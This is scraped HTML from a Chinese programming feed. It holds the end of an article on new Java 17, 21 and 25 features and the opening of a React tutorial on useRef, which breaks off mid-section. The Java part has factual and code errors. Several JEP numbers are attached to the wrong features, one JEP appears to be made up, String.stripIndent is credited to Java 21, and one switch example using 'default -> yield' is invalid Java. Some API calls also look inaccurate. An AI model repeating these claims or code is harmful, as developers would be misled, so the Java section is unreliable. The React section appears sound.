<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">"""
    {
        "name": "Alice",
        "age": 30
    }
    """</span>;
</code></pre>
<h3 data-id="heading-22">3.4. ‌增强的随机数生成 API</h3>
<p>Java 17 引入了一组全新的随机数生成器 API，提供更好的性能和灵活性，支持多种随机数生成策略。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">RandomGenerator</span> <span class="hljs-variable">generator</span> <span class="hljs-operator">=</span> RandomGenerator.of(<span class="hljs-string">"L128X256MixRandom"</span>);
<span class="hljs-type">int</span> <span class="hljs-variable">randomInt</span> <span class="hljs-operator">=</span> generator.nextInt(<span class="hljs-number">100</span>); <span class="hljs-comment">// 生成 0 到 99 之间的随机整数</span>
</code></pre>
<h3 data-id="heading-23">3.5. JEP 411: java.nio.file.Path 的方法增强</h3>
<p>新增的 Path 方法可以方便地从文件系统路径中获取文件名、父目录等信息。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"/usr/local/bin/java"</span>);
System.out.println(path.getFileName()); <span class="hljs-comment">// 输出 "java"</span>
</code></pre>
<h3 data-id="heading-24">3.6. JEP 382: 新的 switch 表达式模式匹配</h3>
<p>Java 17 对 switch 表达式进行了改进，简化了代码逻辑，使得处理多种情况更加直观。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">dayType</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (day) {
    <span class="hljs-keyword">case</span> MONDAY, FRIDAY -&gt; <span class="hljs-string">"Working Day"</span>;
    <span class="hljs-keyword">case</span> SATURDAY, SUNDAY -&gt; <span class="hljs-string">"Weekend"</span>;
    <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">"Unknown"</span>;
};
</code></pre>
<h3 data-id="heading-25">3.7. 外部函数和内存访问 API（JEP 412）</h3>
<p>Java 17 提供了一种新的 API，用于与外部代码库进行交互，能够更容易、更安全地访问本地代码。</p>
<h3 data-id="heading-26">3.8. 移除旧的和不再使用的特性</h3>
<p>Java 17 移除了多个较旧和不再使用的特性，例如移除了 Applet API 和其他过时的组件，以减少平台的复杂性。</p>
<h3 data-id="heading-27">3.9. 性能优化和安全性增强</h3>
<p>Java 17 在性能和安全性方面进行了许多底层优化，以提高整体运行效率和安全性。</p>
<h2 data-id="heading-28">4. Java 21</h2>
<h3 data-id="heading-29">4.1. ‌增强的模式匹配（Pattern Matching for switch）</h3>
<p>Java 21 引入了对 switch 表达式的模式匹配，允许使用更灵活的条件来处理不同类型的对象。这使得可以在 switch 中简化类型检查和转换逻辑。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 多值匹配</span>
<span class="hljs-type">String</span> <span class="hljs-variable">unit</span> <span class="hljs-operator">=</span> <span class="hljs-string">"cm"</span>;
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (unit) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"cm"</span>, <span class="hljs-string">"m"</span> -&gt; <span class="hljs-string">"厘米"</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"mm"</span> -&gt; <span class="hljs-string">"毫米"</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"km"</span> -&gt; <span class="hljs-string">"千米"</span>;
    <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">"错误"</span>;
};
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello, World!"</span>;
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (obj) {
    <span class="hljs-keyword">case</span> String s -&gt; s.toUpperCase();
    <span class="hljs-keyword">case</span> Integer i -&gt; <span class="hljs-string">"Integer: "</span> + i;
    <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">"Unknown type"</span>;
};
</code></pre>
<h3 data-id="heading-30">4.2. 记录类（Record Classes）增强</h3>
<p>Java 21 对记录类进行了增强，允许在记录类中定义额外的方法、静态方法和实现接口。这使得记录类的功能更加丰富。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">record</span> <span class="hljs-title class_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">info</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name + <span class="hljs-string">" is "</span> + age + <span class="hljs-string">" years old."</span>;
    }
}
</code></pre>
<h3 data-id="heading-31">4.3. ‌虚拟线程（Virtual Threads）</h3>
<p>虚拟线程是 Java 21 的重要新特性，旨在显著简化并发编程，使得开发者能够轻松构建高并发应用程序。虚拟线程不再依赖于操作系统线程，而是通过 JVM 管理，从而减小了资源开销。</p>
<p>通过 M:N 调度模型（JVM 管理轻量级线程，映射到少量 OS 线程）实现高并发，单线程内存占用仅 400 字节（传统线程需 1MB+），支持百万级并发任务。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建虚拟线程</span>
Thread.startVirtualThread(() -&gt; {
    System.out.println(<span class="hljs-string">"轻量级线程: "</span> + Thread.currentThread());
});

<span class="hljs-comment">// 虚拟线程池（生产推荐）</span>
<span class="hljs-keyword">try</span> (<span class="hljs-type">var</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newVirtualThreadPerTaskExecutor()) {
    IntStream.range(<span class="hljs-number">0</span>, <span class="hljs-number">1_000_000</span>).forEach(i -&gt; 
        executor.submit(() -&gt; processTask(i))
    );
}

Thread.ofVirtual().start(() -&gt; {
    <span class="hljs-comment">// 执行任务</span>
});
</code></pre>
<h3 data-id="heading-32">4.4. 外部记忆 API（Foreign Function &amp; Memory API）</h3>
<p>这是一个实验性 API，提供了一种安全且高效地访问本地代码和内存的方式。它使得与 C 和其他语言编码交互变得更加容易和安全。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">MemorySegment</span> <span class="hljs-variable">segment</span> <span class="hljs-operator">=</span> MemorySegment.allocateNative(<span class="hljs-number">100</span>);
segment.set(<span class="hljs-number">0</span>, <span class="hljs-number">42</span>); <span class="hljs-comment">// 设置数据</span>
</code></pre>
<h3 data-id="heading-33">4.5. 增强的 JEP（JDK Enhancement Proposals）</h3>
<p>Java 21 包含若干个重要的 JEP，例如：</p>
<ul>
<li>JEP 420: 列表类（List） — 提供了更方便的操作。</li>
<li>JEP 421: Scoped Values — 一种新的 API，用于传递线程本地值。</li>
</ul>
<h3 data-id="heading-34">4.6. JEP 431: String 方法的增强</h3>
<p>Java 21 为 String 类增加了几个新方法，比如 String.stripIndent() 和 String.translateEscapes()，这些方法使字符串处理更加灵活。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> <span class="hljs-string">"""
    Hello,
        World!
    """</span>.stripIndent(); <span class="hljs-comment">// 可以去除缩进</span>
</code></pre>
<h3 data-id="heading-35">4.7. ‌Switch 表达式的增强</h3>
<p>在 switch 表达式中，可以使用 yield 关键字返回结果，从而提高可读性。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;
<span class="hljs-type">String</span> <span class="hljs-variable">description</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (number) {
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span> -&gt; <span class="hljs-string">"One"</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span> -&gt; <span class="hljs-string">"Two"</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span> -&gt; <span class="hljs-string">"Three"</span>;
    <span class="hljs-keyword">default</span> -&gt; <span class="hljs-keyword">yield</span> <span class="hljs-string">"Unknown Number"</span>;
};
</code></pre>
<h3 data-id="heading-36">4.8. 性能优化和安全性增强</h3>
<p>Java 21 在底层实现上进行了多个性能优化和安全性增强，以提高运行时效率和减少潜在的安全漏洞。</p>
<h2 data-id="heading-37">5. Java 25</h2>
<h3 data-id="heading-38">5.1. 实例<code>main</code>方法</h3>
<p>不再需要<code>public static void main(String[] args)</code>的“仪式性”代码。现在，入门可以如此简单：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorld</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> { <span class="hljs-comment">// 注意：没有static，没有public</span>
        System.out.println(<span class="hljs-string">"你好，Java 25!"</span>);
    }
}
</code></pre>
<p>新手写第一个程序时，不用再被<code>static、String[] args</code>这些复杂概念吓到，学习曲线更平滑。</p>
<h3 data-id="heading-39">5.2. 灵活构造函数体</h3>
<p>允许在调用父类构造器（<code>super()</code>）之前执行一些逻辑，比如参数校验。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PositiveInteger</span> {
    <span class="hljs-type">int</span> value;
    PositiveInteger(<span class="hljs-type">int</span> val) {
        <span class="hljs-keyword">if</span> (val &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"必须为正数"</span>);
        <span class="hljs-built_in">super</span>(); <span class="hljs-comment">// 现在这行可以写在后面了</span>
        <span class="hljs-built_in">this</span>.value = val;
    }
}
</code></pre>
<p>以前构造函数的写法很死板，必须先调用<code>super()</code>，现在可以更自由地安排初始化逻辑的顺序，让代码更合理。</p>
<h3 data-id="heading-40">5.3. 原始类型模式匹配</h3>
<p>在<code>instanceof</code>和<code>switch</code>中直接匹配<code>int</code>、<code>double</code>等基本类型。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-number">42</span>;
<span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-type">int</span> i) { <span class="hljs-comment">// 直接匹配int类型</span>
    System.out.println(<span class="hljs-string">"这是一个整数: "</span> + i);
}
</code></pre>
<p>处理未知类型的对象时，对于基本类型也能像对象一样进行优雅的类型判断和提取，代码更统一、安全。</p>
<h3 data-id="heading-41">5.4. 作用域值</h3>
<p>用于在线程（特别是虚拟线程）内高效、安全地传递数据，旨在替代老旧的<code>ThreadLocal</code>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> ScopedValue&lt;String&gt; USER = ScopedValue.newInstance();

<span class="hljs-comment">// 在某个作用域内绑定值</span>
ScopedValue.where(USER, <span class="hljs-string">"张三"</span>).run(() -&gt; {
    System.out.println(USER.get()); <span class="hljs-comment">// 输出：张三</span>
    <span class="hljs-comment">// 在这里启动的虚拟线程也会自动继承这个值</span>
});
</code></pre>
<p>虚拟线程的“轻量”也要求数据共享方式必须高效。作用域值就像是为虚拟线程量身定制的“任务传声筒”，比传统方式更快、更不易出错。</p>
<h3 data-id="heading-42">5.5. 向量API</h3>
<p>允许你编写能充分利用CPU SIMD指令的代码，大幅提升科学计算、AI模型推理等场景的性能。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 将两个浮点数数组进行向量化加法（伪代码风格，实际使用需创建VectorSpecies）</span>
<span class="hljs-type">float</span>[] a = {<span class="hljs-number">1.0f</span>, <span class="hljs-number">2.0f</span>, <span class="hljs-number">3.0f</span>, <span class="hljs-number">4.0f</span>};
<span class="hljs-type">float</span>[] b = {<span class="hljs-number">5.0f</span>, <span class="hljs-number">6.0f</span>, <span class="hljs-number">7.0f</span>, <span class="hljs-number">8.0f</span>};
<span class="hljs-type">float</span>[] c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">float</span>[<span class="hljs-number">4</span>];

<span class="hljs-type">var</span> <span class="hljs-variable">species</span> <span class="hljs-operator">=</span> FloatVector.SPECIES_256;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; a.length; i += species.length()) {
    <span class="hljs-type">var</span> <span class="hljs-variable">va</span> <span class="hljs-operator">=</span> FloatVector.fromArray(species, a, i);
    <span class="hljs-type">var</span> <span class="hljs-variable">vb</span> <span class="hljs-operator">=</span> FloatVector.fromArray(species, b, i);
    <span class="hljs-type">var</span> <span class="hljs-variable">vc</span> <span class="hljs-operator">=</span> va.add(vb);
    vc.intoArray(c, i);
}
<span class="hljs-comment">// 结果c为：[6.0, 8.0, 10.0, 12.0]，且CPU是并行计算的</span>
</code></pre>
<p>以前Java做大量数据计算时有点“笨拙”，一次只能算一个数。向量API让它能“一心多用”，让CPU一次性处理一大块数据，特别适合图像处理、机器学习这些领域。</p>
<h3 data-id="heading-43">5.6. 密钥派生函数API</h3>
<p>提供了生成加密密钥的标准方法。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 使用HKDF算法从主密钥派生子密钥</span>
<span class="hljs-type">SecretKey</span> <span class="hljs-variable">masterKey</span> <span class="hljs-operator">=</span> ... <span class="hljs-comment">// 主密钥</span>
<span class="hljs-type">KDF</span> <span class="hljs-variable">kdf</span> <span class="hljs-operator">=</span> KDF.of(<span class="hljs-string">"HKDF-SHA256"</span>);
<span class="hljs-type">SecretKey</span> <span class="hljs-variable">derivedKey</span> <span class="hljs-operator">=</span> kdf.deriveKey(masterKey, <span class="hljs-string">"会话密钥"</span>.getBytes(), <span class="hljs-number">32</span>);
</code></pre>
<p>加密开发更规范了。用一个根密钥安全地生成多个子密钥，就像用一把主钥匙配出几把不同用途的房门钥匙，是构建现代安全系统的基础。</p>
<h3 data-id="heading-44">5.7. JVM与底层：更省内存，更快启动</h3>
<p><strong>紧凑对象头</strong>：显著减少了64位系统上每个对象的内存开销。假设你的应用有数百万个小型对象（如订单项、DTO），这个优化可能直接带来10%以上的堆内存节省，并因更好的缓存利用率而提升速度。</p>
<p><strong>分代Shenandoah垃圾回收器</strong>：低暂停时间的GC现在对年轻代和老年代采用不同优化策略，在保持“停顿时间短”优点的同时，提升了整体吞吐量和内存效率。对于需要高响应性的服务（如交易系统）是不错的选择。</p>
<p><strong>提前方法分析与JFR增强</strong>：前者通过复用分析数据加速大型应用的启动；后者如方法剖析，能帮你精准定位到消耗CPU的具体方法，而不是仅仅停留在类层面，让性能调优事半功倍。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解 React 中的 useRef：不只是获取 DOM 元素]]></title>    <link>https://juejin.cn/post/7589930672833478691</link>    <guid>https://juejin.cn/post/7589930672833478691</guid>    <pubDate>2026-01-01T12:05:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589930672833478691" data-draft-id="7589935326782013474" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解 React 中的 useRef：不只是获取 DOM 元素"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2026-01-01T12:05:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ohyeah"/> <meta itemprop="url" content="https://juejin.cn/user/740446536480618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解 React 中的 useRef：不只是获取 DOM 元素
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/740446536480618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ohyeah
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T12:05:00.000Z" title="Thu Jan 01 2026 12:05:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 React 函数组件的世界中，<code>useRef</code> 是一个常被提及但又容易被误解的 Hook。很多初学者第一次接触它时，往往只把它当作“获取 DOM 元素”的工具；而随着使用深入，又可能会疑惑：为什么不能用 <code>useRef</code> 替代 <code>useState</code> 来避免不必要的重渲染？本文将结合两个典型示例，系统梳理 <code>useRef</code> 的核心机制、使用场景与常见误区，帮助你真正掌握这个“默默奉献”的 Hook。</p>
<hr/>
<h2 data-id="heading-0">一、useRef 的基本能力：持久化引用对象</h2>
<p><code>useRef</code> 的本质是创建一个<strong>可变且持久化的引用对象</strong>。它的返回值是一个普通 JavaScript 对象，结构为 <code>{ current: initialValue }</code>。关键在于：</p>
<ul>
<li><strong>每次组件重新渲染时，<code>useRef</code> 返回的是同一个对象引用</strong>；</li>
<li>修改 <code>.current</code> 属性<strong>不会触发组件重新渲染</strong>；</li>
<li>它不参与 React 的响应式更新机制，因此被称为“非响应式存储”。</li>
</ul>
<p>这与 <code>useState</code> 形成鲜明对比：<code>useState</code> 的状态变更会触发 UI 更新，而 <code>useRef</code> 的变更则“静默”发生。</p>
<hr/>
<h2 data-id="heading-1">二、场景一：获取 DOM 元素并操作</h2>
<p>最常见的 <code>useRef</code> 用法是绑定到 JSX 元素上，从而在组件逻辑中直接操作 DOM。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useRef, useEffect, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 组件挂载后，inputRef.current 指向真实的 &lt;input&gt; 元素</span>
    inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> /&gt;</span>
      {count}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;count ++<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}
</code></pre>
<p>在这个例子中：</p>
<ul>
<li>初始渲染时，<code>inputRef.current</code> 为 <code>null</code>，因为 DOM 尚未生成；</li>
<li>React 在完成 DOM 挂载后，会自动将对应的 DOM 节点赋值给 <code>ref.current</code>；</li>
<li><code>useEffect</code>（依赖项为空数组）在首次挂载后执行，此时 <code>inputRef.current</code> 已是有效的 <code>&lt;input&gt;</code> 元素，调用 <code>.focus()</code> 实现自动聚焦。</li>
</ul>
<p>值得注意的是：<strong>即使 <code>inputRef.current</code> 从 <code>null</code> 变为 DOM 节点，组件也不会重新渲染</strong>。这正是 <code>useRef</code> 的设计初衷——提供一种不干扰 React 渲染流程的方式来访问或存储数据。</p>
<hr/>
<h2 data-id="heading-2">三、场景二：存储可变值以避免状态重置</h2>
<p>除了操作 DOM，<code>useRef</code> 还非常适合用于<strong>在多次渲染之间持久化存储可变值</strong>，尤其是在处理副作用（如定时器）时。</p>
<p>考虑以下错误写法：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ❌ 错误：使用普通变量存储定时器 ID</span>
<span class="hljs-keyword">let</span> intervalId = <span class="hljs-literal">null</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"/>) {
  intervalId = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'tick~~~'</span>);
  }, <span class="hljs-number">1000</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
  <span class="hljs-built_in">clearInterval</span>(intervalId); <span class="hljs-comment">// 可能为 null！</span>
}
</code></pre>
<p>问题在于：每当 <code>count</code> 状态更新，整个函数组件会重新执行，<code>let intervalId = null</code> 会被再次初始化，导致之前保存的定时器 ID 丢失。结果是：</p>
<ul>
<li>多次点击“开始”会创建多个定时器；</li>
<li>“停止”按钮无法清除旧的定时器；</li>
<li>造成<strong>内存泄漏</strong>和<strong>逻辑混乱</strong>。</li>
</ul>
<p>正确的做法是使用 <code>useRef</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useEffect, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> intervalId = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"/>) {
    intervalId.<span class="hljs-property">current</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'tick~~~'</span>);
    }, <span class="hljs-number">1000</span>);
  }

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">clearInterval</span>(intervalId.<span class="hljs-property">current</span>);
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{start}</span>&gt;</span>开始<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{stop}</span>&gt;</span>停止<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      {count}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;count ++<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}
</code></pre>
<p>这里的关键在于：</p>
<ul>
<li><code>useRef(null)</code> 在组件整个生命周期内始终返回<strong>同一个对象</strong>；</li>
<li>即使 <code>count</code> 更新导致组件重新渲染，<code>intervalId.current</code> 依然保留着上次设置的定时器 ID；</li>
<li>因此 <code>clearInterval</code> 能正确清除目标定时器，避免资源泄露。</li>
</ul>
<hr/>
<h2 data-id="heading-3">四、useRef 与 useState 的核心区别</h2>
<p>虽然 <code>useRef</code> 和 <code>useState</code> 都能“存值”，但它们的设计目标截然不同：</p>






























